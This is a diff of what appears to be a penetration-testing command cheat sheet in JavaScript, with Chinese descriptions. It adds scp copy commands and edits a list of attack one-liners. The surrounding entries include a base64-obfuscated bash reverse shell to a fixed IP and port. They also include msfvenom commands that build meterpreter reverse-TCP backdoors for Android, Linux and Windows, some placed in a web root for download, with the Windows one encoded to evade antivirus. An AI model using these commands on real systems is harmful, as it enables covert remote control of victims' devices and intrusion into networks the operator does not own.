@@ -224,6 +224,9 @@
       
       //ssh命令
       { command: 'ssh root@#IP#', description: '通过SSH连接到目标IP' },
+      { command: 'scp free.deb root@#IP#:/root/',description: '将本地文件 free.deb 复制到远程服务器用户家目录下'},
+      { command: 'scp -r /root/free/ root@#IP#:/root/',description: '将本地文件夹 复制到远程服务器用户家目录下'},
+      { command: 'scp -P 22 root@#IP#:/root/mkn /root/',description: '通过端口22从远程服务器复制文件到本地'},
 
       //kali修改ip
       { command: 'vim /etc/network/interfaces', description: 'kali凯丽修改IP配置' },
@@ -395,7 +398,7 @@
       { command: 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuNTMvNDQ0NCAwPiYx | base64 -d | bash', description: 'base64转换后的反弹命令-linux 反弹与监听' },
       //mm生成
       { command: 'msfvenom -p android/meterpreter_reverse_tcp lhost=192.168.1.53 lport=4444 R -o /var/www/html/an.apk', description: '安卓美美-mm生成' },
-      { command: 'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.53 LPORT=4444 -b "\0x00" -f elf -o /var/www/html/mkn-ghost', description: 'linux美美-mm生成' },
+      { command: 'msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.53 LPORT=4444 -b "\x00" -f elf -o /var/www/html/mkn-ghost', description: 'linux美美-mm生成' },
       { command: 'msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.1.53 LPORT=4444 -b "\x00" -e x86/shikata_ga_nai  -i 10 -f exe -o windowsmm.exe', description: 'windows美美-mm生成' },
 
       //经典名句
